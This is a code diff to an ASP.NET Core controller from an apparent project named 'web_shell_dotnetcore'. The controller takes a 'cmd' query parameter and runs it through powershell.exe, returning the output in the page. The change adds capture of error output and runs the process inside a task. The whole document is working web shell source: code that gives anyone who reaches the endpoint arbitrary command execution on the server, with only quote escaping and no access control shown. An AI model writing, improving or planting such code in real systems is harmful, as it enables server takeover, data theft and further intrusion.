@@ -23,7 +23,7 @@ namespace web_shell_dotnetcore.Controllers
         // GET: PowerShellCMs
         public async Task<IActionResult> Index(string cmd)
         {
-            var result = "";
+            string result = "", error = "";
             var escapedArgs = cmd.Replace("\"", "\\\"");
             var process = new Process()
             {
@@ -32,16 +32,20 @@ namespace web_shell_dotnetcore.Controllers
                     FileName = "powershell.exe",
                     Arguments = $"-c \"{escapedArgs}\"",
                     RedirectStandardOutput = true,
+                    RedirectStandardError = true,
                     UseShellExecute = false,
                     CreateNoWindow = true,
                 }
             };
+            await Task.Run(() =>
+            {
+                process.Start();
+                result = process.StandardOutput.ReadToEnd();
+                error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+                ViewBag.res = error == "" ? result : error;
+            });
 
-            process.Start();
-            result = process.StandardOutput.ReadToEnd();
-            process.WaitForExit();
-
-            ViewBag.res = result;
             return View();
         }
 
